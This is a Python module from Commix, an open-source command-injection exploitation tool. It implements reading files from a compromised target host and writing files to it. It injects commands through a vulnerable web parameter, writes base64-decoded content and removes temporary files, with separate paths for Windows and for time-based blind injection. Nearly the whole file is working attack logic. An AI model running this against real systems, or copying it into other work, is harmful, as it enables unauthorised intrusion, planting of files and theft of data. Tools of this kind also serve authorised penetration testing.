#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

from src.core.parse import cmdline as menu
from src.utils import settings
from src.utils import session_handler
from src.core.controller import checks
from src.core.controller import execution
from src.thirdparty.six.moves import urllib as _urllib

"""
Write to a file on the target host.
"""
def file_write(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, url_time_response, technique):
  fresh_time = False
  results_based_injector = False
  file_to_write, dest_to_write, content = checks.check_file_to_write()
  if settings.TARGET_OS == settings.OS.WINDOWS:
    if technique == settings.INJECTION_TECHNIQUE.DYNAMIC_CODE:
      injector = execution.select_injector(technique)
    else:
      injector = execution.select_injector(settings.INJECTION_TECHNIQUE.CLASSIC)
      results_based_injector = True
      if settings.TIME_RELATED_ATTACK:
        whitespace = settings.WHITESPACES[0]
        fresh_time = True
    fire = execution.make_simple_execute_cmd(injector, separator, maxlen, TAG, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, interpreter, filename, url_time_response, technique, OUTPUT_TEXTFILE, results_based_injector=results_based_injector)
    fname, tmp_fname, cmd = checks.find_filename(dest_to_write, content)
    fire(cmd)
    cmd = checks.win_decode_b64_enc(fname, tmp_fname)
    fire(cmd)
    cmd = checks.delete_tmp(tmp_fname)
    shell = fire(cmd)
  else:
    injector = execution.select_injector(technique)
    fire = execution.make_simple_execute_cmd(injector, separator, maxlen, TAG, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, interpreter, filename, url_time_response, technique, OUTPUT_TEXTFILE)
    cmd = checks.write_content(content, dest_to_write)
    if settings.TIME_RELATED_ATTACK:
      cmd = cmd + _urllib.parse.quote(separator) + settings.FILE_READ + dest_to_write
    elif technique == settings.INJECTION_TECHNIQUE.FILE_BASED:
      cmd = cmd + settings.SINGLE_WHITESPACE + settings.COMMENT
    shell = fire(cmd)
  cmd = checks.check_file(dest_to_write)
  if settings.TIME_RELATED_ATTACK:
    # Whether the file arrived is asked either way. Verbosity decides whether a blank line is
    # printed first, not whether the check runs - reported unverified, a write that succeeded was
    # announced as missing, and one that failed as present.
    if settings.VERBOSITY_LEVEL == 0 and not fresh_time:
      settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
    shell = fire(cmd)
  else:
    if settings.USE_BACKTICKS:
      cmd = checks.remove_command_substitution(cmd)
    shell = fire(cmd)
  if settings.TIME_RELATED_ATTACK:
    if settings.VERBOSITY_LEVEL == 0:
      settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
  checks.file_write_status(shell, dest_to_write)

"""
Read a file from the target host.
"""
def file_read(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, url_time_response, technique):
  injector = execution.select_injector(technique)
  cmd, file_to_read = checks.file_content_to_read()
  execute_cmd = execution.make_execute_cmd(injector, separator, maxlen, TAG, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, interpreter, filename, url_time_response, technique, OUTPUT_TEXTFILE)
  needs_fresh = not checks.usable_stored_cmd(session_handler.export_stored_cmd(url, cmd, vuln_parameter)) or menu.options.ignore_session
  if needs_fresh and settings.TIME_RELATED_ATTACK and technique in (settings.INJECTION_TECHNIQUE.TIME_BASED, settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED) and \
     not checks.file_readable(separator, timesec, http_request_method, url, vuln_parameter, whitespace, prefix, suffix, url_time_response, file_to_read, technique):
    shell, fresh = "", False
  else:
    shell, fresh = execute_cmd(cmd)
  if settings.TIME_RELATED_ATTACK:
    if settings.VERBOSITY_LEVEL == 0 and fresh and len(shell) != 0:
      settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
  checks.file_read_status(shell, file_to_read, filename)

"""
Check the defined options
"""
def do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, url_time_response, technique):
  if menu.options.file_write:
    file_write(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, url_time_response, technique)
    settings.FILE_ACCESS_DONE = True
    
  if menu.options.file_read:
    file_read(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, url_time_response, technique)
    settings.FILE_ACCESS_DONE = True

"""
Check stored session
"""
def stored_session(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, url_time_response, technique):
  # Target-wide - run once, on the first successful technique.
  if not settings.FILE_ACCESS_DONE and menu.file_access_options():
    do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, url_time_response, technique)

# eof
